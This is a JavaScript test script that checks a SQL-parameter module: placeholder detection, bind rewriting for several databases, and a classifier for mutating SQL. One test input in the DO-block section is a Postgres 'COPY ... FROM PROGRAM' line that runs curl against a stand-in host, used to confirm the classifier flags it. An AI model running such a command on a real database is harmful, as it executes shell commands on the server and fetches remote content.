'use strict';

const path = require('path');
const fs = require('fs');
const os = require('os');
const esbuild = require('esbuild');

const root = path.join(__dirname, '..');
const outDir = path.join(os.tmpdir(), `bisql-parameters-${process.pid}`);
fs.rmSync(outDir, { recursive: true, force: true });
fs.mkdirSync(outDir, { recursive: true });

const vscodeStub = path.join(outDir, 'vscode.js');
fs.writeFileSync(
    vscodeStub,
    [
        'class Position { constructor(line, character) { this.line = line; this.character = character; } }',
        'class Range { constructor(start, end) { this.start = start; this.end = end; } }',
        'module.exports = { Position, Range };',
        ''
    ].join('\n')
);

esbuild.buildSync({
    entryPoints: [path.join(root, 'src/sql/parameters.ts')],
    bundle: true,
    platform: 'node',
    format: 'cjs',
    outfile: path.join(outDir, 'parameters.js'),
    alias: { vscode: vscodeStub }
});

const {
    uniquePlaceholderNames,
    applyPlaceholders,
    findPlaceholders,
    paramFieldsForSql,
    rewriteNamedBinds,
    unwrapBindValue,
    lookupBind,
    lookupParam,
    bindValueFromInput,
    isMutatingSql
} = require(path.join(outDir, 'parameters.js'));

function assert(name, actual, check) {
    const ok = typeof check === 'function' ? check(actual) : JSON.stringify(actual) === JSON.stringify(check);
    if (!ok) {
        console.error(`FAIL ${name}`);
        console.error(' actual:', JSON.stringify(actual));
        console.error(' expect:', typeof check === 'function' ? check.toString() : JSON.stringify(check));
        process.exitCode = 1;
        return;
    }
    console.log(`PASS ${name}`);
}

assert(
    'unique names keep first spelling',
    uniquePlaceholderNames('SELECT {Hours} FROM t WHERE x = {hours} AND y = {filter_clause}'),
    ['Hours', 'filter_clause']
);

assert(
    'skips ODBC date wrapper',
    uniquePlaceholderNames("SELECT {d '2020-01-01'}, {hours} FROM t"),
    ['hours']
);

assert(
    'skips ODBC {call} and {fn}',
    uniquePlaceholderNames('SELECT {fn GETDATE()}, {call} FROM t'),
    []
);

assert(
    'finds placeholder inside a SQL string',
    uniquePlaceholderNames("SELECT * FROM t WHERE ts > '{last_read_tstamp}' AND code = 'id-{n}'"),
    ['last_read_tstamp', 'n']
);

assert(
    'skips doubled braces',
    uniquePlaceholderNames('SELECT {{hours}} FROM t'),
    []
);

assert(
    'skips empty braces and {0}',
    uniquePlaceholderNames('SELECT {} FROM t WHERE id = {0}'),
    []
);

assert(
    'finds {foo.bar}',
    uniquePlaceholderNames('SELECT {foo.bar} FROM t'),
    ['foo.bar']
);

assert(
    'finds f-string function calls',
    uniquePlaceholderNames(
        'SELECT {get_building_fields(trailing_comma=True)} facility_long_name FROM facilities'
    ),
    ['get_building_fields(trailing_comma=True)']
);

assert(
    'same call is asked once; different calls stay distinct',
    uniquePlaceholderNames(
        'SELECT {get_building_fields(trailing_comma=True)}, {get_building_fields(trailing_comma=False)}, {get_building_fields(trailing_comma=True)} FROM t'
    ),
    ['get_building_fields(trailing_comma=True)', 'get_building_fields(trailing_comma=False)']
);

assert(
    'ignores JSON object in a SQL string',
    uniquePlaceholderNames("SELECT * FROM t WHERE payload = '{\"a\": 1}' AND id = {hours}"),
    ['hours']
);

assert(
    'finds a call inside a SQL string',
    uniquePlaceholderNames("SELECT * FROM t WHERE ts > '{get_foo()}'"),
    ['get_foo()']
);

assert(
    'ignores placeholders in comments',
    uniquePlaceholderNames('SELECT 1 -- {hours}\nFROM t /* {filter_clause} */'),
    []
);

const mixed = "SELECT {hours} FROM t WHERE ts > '{last_read_tstamp}' {filter_clause}";
assert(
    'pastes values including inside strings',
    applyPlaceholders(mixed, {
        hours: '24',
        last_read_tstamp: '2020-01-01',
        filter_clause: 'AND x = 1'
    }),
    "SELECT 24 FROM t WHERE ts > '2020-01-01' AND x = 1"
);

assert(
    'missing key stays as {name}',
    applyPlaceholders('SELECT {hours} FROM t', {}),
    'SELECT {hours} FROM t'
);

assert(
    'null pastes nothing',
    applyPlaceholders('SELECT {hours} FROM t {filter_clause}', { hours: null, filter_clause: null }),
    'SELECT  FROM t '
);

assert(
    'empty string pastes nothing',
    applyPlaceholders('SELECT 1 {filter_clause}', { filter_clause: '' }),
    'SELECT 1 '
);

assert(
    'param fields list placeholders before binds',
    paramFieldsForSql('SELECT {hours} FROM t WHERE id = :id'),
    [
        { name: 'hours', kind: 'placeholder' },
        { name: 'id', kind: 'bind' }
    ]
);

assert(
    'shared name is shown once as placeholder',
    paramFieldsForSql('SELECT {id} FROM t WHERE x = :id'),
    [{ name: 'id', kind: 'placeholder' }]
);

assert(
    'findPlaceholders reports spans in order',
    findPlaceholders('SELECT {a}, {b} FROM t').map((item) => item.name),
    ['a', 'b']
);

const buildingCall = '{get_building_fields(trailing_comma=True)}';
const buildingSql = `SELECT ${buildingCall} facility_long_name FROM facilities`;
assert(
    'pastes over a function-call placeholder',
    applyPlaceholders(buildingSql, {
        'get_building_fields(trailing_comma=True)': 'facility_id, facility_name,'
    }),
    'SELECT facility_id, facility_name, facility_long_name FROM facilities'
);

assert(
    'function-call span covers the whole braces',
    findPlaceholders(buildingSql).map((item) => buildingSql.slice(item.start, item.end)),
    [buildingCall]
);

assert(
    'mysql rewrite turns :name into ? including keyword path',
    rewriteNamedBinds("CONCAT(:path, SUBSTRING(s3_key, :path_start), :path)", 'qmark'),
    { sql: "CONCAT(?, SUBSTRING(s3_key, ?), ?)", namesInOrder: ['path', 'path_start', 'path'] }
);

assert(
    'postgres rewrite uses $1 $2 in appearance order',
    rewriteNamedBinds('SELECT :path, :path_start', 'dollar'),
    { sql: 'SELECT $1, $2', namesInOrder: ['path', 'path_start'] }
);

assert(
    'sql server rewrite uses @name',
    rewriteNamedBinds('SELECT :path', 'at'),
    { sql: 'SELECT @path', namesInOrder: ['path'] }
);

assert(
    'rewrite skips binds inside strings and :: casts',
    rewriteNamedBinds("SELECT ':path', 1::int, :id", 'qmark'),
    { sql: "SELECT ':path', 1::int, ?", namesInOrder: ['id'] }
);

assert('unwrap empty SQL string', unwrapBindValue("''"), '');
assert('unwrap empty double quotes', unwrapBindValue('""'), '');
assert('unwrap quoted path', unwrapBindValue("'folder/'"), 'folder/');
assert('unwrap leaves plain text', unwrapBindValue('folder/'), 'folder/');
assert('unwrap leaves SQL NULL', unwrapBindValue(null), null);
assert('unwrap leaves inner quotes alone', unwrapBindValue("'it''s'"), "'it''s'");
assert(
    'lookupBind unwraps quoted empty',
    lookupBind({ path: "''", path_start: '1' }, 'path'),
    ''
);
assert(
    'lookupBind keeps a number',
    lookupBind({ path: "''", path_start: '1' }, 'path_start'),
    '1'
);
assert(
    'lookupParam keeps a quoted grid value',
    lookupParam({ v: "'folder/'" }, 'v'),
    "'folder/'"
);
assert(
    'lookupBind unwraps typed quotes',
    lookupBind({ v: "'folder/'" }, 'v'),
    'folder/'
);

assert('input blank is empty string', bindValueFromInput(''), '');
assert('input NULL word is SQL NULL', bindValueFromInput('NULL'), null);
assert('input null word is SQL NULL', bindValueFromInput('null'), null);
assert('input quoted empty is empty string', bindValueFromInput("''"), '');
assert('input plain text stays', bindValueFromInput('folder/'), 'folder/');

assert(
    'show create view is read-only',
    isMutatingSql('SHOW CREATE VIEW datalign_dev.user_levels_view'),
    false
);
assert(
    'show create table is read-only',
    isMutatingSql('SHOW CREATE TABLE datalign_dev.users'),
    false
);
assert('explain insert is read-only', isMutatingSql('EXPLAIN INSERT INTO t SELECT 1'), false);
assert(
    'explain analyze insert mutates',
    isMutatingSql('EXPLAIN ANALYZE INSERT INTO t SELECT 1'),
    true
);
assert(
    'explain analyse insert mutates',
    isMutatingSql('EXPLAIN ANALYSE INSERT INTO t SELECT 1'),
    true
);
assert(
    'explain (analyse) delete mutates',
    isMutatingSql('EXPLAIN (ANALYSE) DELETE FROM t'),
    true
);
assert(
    'explain (verbose, analyze) delete mutates',
    isMutatingSql('EXPLAIN (VERBOSE, ANALYZE) DELETE FROM t'),
    true
);
assert(
    'explain (buffers, analyze) update mutates',
    isMutatingSql('EXPLAIN (BUFFERS, ANALYZE) UPDATE t SET a = 1'),
    true
);
assert(
    'explain verbose analyze delete mutates',
    isMutatingSql('EXPLAIN VERBOSE ANALYZE DELETE FROM t'),
    true
);
assert(
    'explain (analyze false) does not run the delete',
    isMutatingSql('EXPLAIN (ANALYZE FALSE) DELETE FROM t'),
    false
);
assert(
    'explain (analyze off) does not run the delete',
    isMutatingSql('EXPLAIN (ANALYZE OFF) DELETE FROM t'),
    false
);
assert('explain verbose select is read-only', isMutatingSql('EXPLAIN VERBOSE SELECT * FROM t'), false);
assert(
    'show then drop still mutates',
    isMutatingSql('SHOW CREATE VIEW v; DROP TABLE t'),
    true
);
assert('mutating DELETE', isMutatingSql('DELETE FROM t'), true);
assert('mutating FOR UPDATE', isMutatingSql('SELECT * FROM t FOR UPDATE'), true);
assert('mutating CALL', isMutatingSql('CALL refresh_stats()'), true);
assert('mutating COPY', isMutatingSql("COPY users FROM '/tmp/load.csv'"), true);
assert('mutating GRANT', isMutatingSql('GRANT ALL ON users TO public'), true);
assert(
    'mutating WITH then CALL',
    isMutatingSql('WITH c AS (SELECT 1) CALL p()'),
    true
);
assert(
    'select replace function',
    isMutatingSql("SELECT replace(name, 'a', 'b') FROM t"),
    false
);
assert('select column named call', isMutatingSql('SELECT call FROM t'), false);
assert(
    'select case then call',
    isMutatingSql('SELECT CASE WHEN 1 THEN call ELSE name END FROM t'),
    false
);
assert(
    'do block copy',
    isMutatingSql("DO $$ COPY users FROM '/tmp/load.csv' $$"),
    true
);
assert(
    'do block copy from program',
    isMutatingSql("DO $$ COPY users FROM PROGRAM 'curl http://example/payload' $$"),
    true
);
assert(
    'do begin copy',
    isMutatingSql("DO $$ BEGIN COPY users FROM '/tmp/load.csv'; END $$"),
    true
);
assert('do block call', isMutatingSql('DO $$ CALL refresh_stats() $$'), true);
assert(
    'do if then copy',
    isMutatingSql("DO $$ IF true THEN COPY users FROM '/tmp/load.csv'; END IF $$"),
    true
);
assert(
    'do tagged quote',
    isMutatingSql("DO $body$ COPY users FROM '/tmp/load.csv' $body$"),
    true
);
assert(
    'do select column named call',
    isMutatingSql('DO $$ SELECT call FROM t $$'),
    false
);
assert(
    'do select case then call',
    isMutatingSql('DO $$ SELECT CASE WHEN 1 THEN call ELSE name END FROM t $$'),
    false
);
assert(
    'quoted dollar is not a body',
    isMutatingSql("SELECT 'DO $$ COPY users FROM ''/tmp/load.csv'' $$'"),
    false
);
assert('refresh materialized view', isMutatingSql('REFRESH MATERIALIZED VIEW v'), true);
assert('vacuum', isMutatingSql('VACUUM users'), true);
assert('lock table', isMutatingSql('LOCK TABLE users'), true);

if (process.exitCode) {
    process.exit(1);
}
console.log('All parameter tests passed.');
